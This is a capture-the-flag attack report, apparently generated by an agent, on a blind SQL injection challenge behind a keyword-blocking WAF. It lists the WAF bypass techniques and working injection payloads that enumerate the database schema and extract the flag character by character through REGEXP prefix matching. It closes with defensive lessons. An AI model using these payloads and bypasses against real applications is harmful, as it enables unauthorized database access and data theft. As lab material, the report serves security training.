# Attack Report -- dasctf-search-blindsqli

**Generated:** 2026-07-21
**Target:** https://xxx.http-ctf2.dasctf.com/
**Challenge Type:** Boolean-based Blind SQL Injection with WAF

## Target Summary

- **Server:** OpenResty (nginx/Lua), PHP 7.3.11, MariaDB 10.3.18
- **Database:** `geek`, MySQL user `root@localhost`
- **Endpoints:** `search.php` (numeric SQLi), `check.php` (login, WAF-protected)
- **Tables:** `F1naI1y` (6 search messages), `Flaaaaag` (flag data: columns `id`, `fl4gawsl`)

## Vulnerability Discovered

- **Type:** Boolean-based blind SQL Injection
- **Location:** GET `id` parameter on `/search.php`
- **SQL context:** Numeric — `SELECT ... WHERE id = $id` (no quotes needed)
- **WAF:** Blocks SQL keywords followed by whitespace (select, from, union, or, and, where, etc.)

### WAF Bypass Techniques

| Technique | Example | Notes |
|-----------|---------|-------|
| SELECT bypass | `SELECT(` | Parenthesis instead of space after keyword |
| FROM bypass | `FROM(SELECT(1))x` | FROM with parenthesized subquery + alias |
| WHERE bypass | `WHERE(` | Same pattern as SELECT |
| substr bypass | `substr(` | Function call without space |
| REGEXP bypass | `)regexp('...')` | REGEXP after `)` — no preceding whitespace |
| AND blocked | N/A | `AND(` triggers WAF (unlike SELECT/FROM) |

### Boolean Oracle

```
id=2-(condition)
```
- TRUE (condition=1) -> id=1 -> "NO! Not this! Click others~~~"
- FALSE (condition=0) -> id=2 -> "yingyingying~ Not this as well~~"

## Exploitation Chain

### Step 1: Extract database info

Payload:
```
id=2-(ord(substr(database(),1,1))=103)
```
Result: TRUE -> database() starts with 'g'

Python blind extraction script extracted:
- `version()` = `10.3.18-MariaDB`
- `database()` = `geek`
- `user()` = `root@localhost`

### Step 2: Enumerate table names

Payload:
```
id=2-(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp('geek')),1,1))=70)
```
Result: Tables = `F1naI1y,Flaaaaag`

### Step 3: Enumerate column names

Payload:
```
id=2-(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp('Flaaaaag')),1,1))=105)
```
Result: Columns = `id,fl4gawsl`

### Step 4: Extract flag via REGEXP prefix matching

Since AND triggers WAF, used subquery+regexp pattern:
```
id=2-((select(fl4gawsl)from(Flaaaaag)where(id)=3)regexp('^Ohhh\\.'))
```

Each character verified with regex prefix:
```
id=2-((select(fl4gawsl)from(Flaaaaag)where(id)=3)regexp('^O'))
id=2-((select(fl4gawsl)from(Flaaaaag)where(id)=3)regexp('^Oh'))
id=2-((select(fl4gawsl)from(Flaaaaag)where(id)=3)regexp('^Ohh'))
id=2-((select(fl4gawsl)from(Flaaaaag)where(id)=3)regexp('^Ohhh'))
id=2-((select(fl4gawsl)from(Flaaaaag)where(id)=3)regexp('^Ohhh\\.'))
id=2-((select(fl4gawsl)from(Flaaaaag)where(id)=3)regexp('^Ohhh\\.y'))
...
```

All rows use dots instead of spaces. Row 3 contains ~500 chars of repeating "you.find.the.flag.read.on..br..ohhh." pattern.

## Flag(s) Captured

| Flag | Location | Method |
|------|----------|--------|
| `Ohhh.you.fInd.the.flag.read.on..br..ohhh...` (501 chars, repeating) | `Flaaaaag.fl4gawsl` row 3 | Boolean blind SQLi + REGEXP prefix extraction |

Full flag saved to `flags/flag.txt`.

## Lessons Learned

- **WAF bypass:** `keyword(` (parenthesis after keyword) bypasses WAF that only checks for `keyword` followed by whitespace. Works for SELECT, FROM, WHERE, substr, but NOT for AND.
- **Subquery+regexp pattern:** `(subquery)regexp('pattern')` combines filtering AND pattern matching without needing the AND keyword, which was still WAF-blocked.
- **REGEXP over =:** `WHERE(table_schema)regexp('geek')` avoids using `=` which is also WAF-blocked in some contexts.
- **Defense:** Parameterized queries would prevent all SQL injection. Blacklist WAF approaches are fundamentally unreliable and easily bypassed.

## Files Saved

- `recon/` — headers, whatweb, page sources
- `flags/flag.txt` — extracted flag (501 chars)
- `flags/flag_partial.txt` — partial extraction
- Extraction scripts: `extract_info.py`, `extract_tables.py`, `get_col.py`, `regexp_extract.py`, `fast_extract.py`
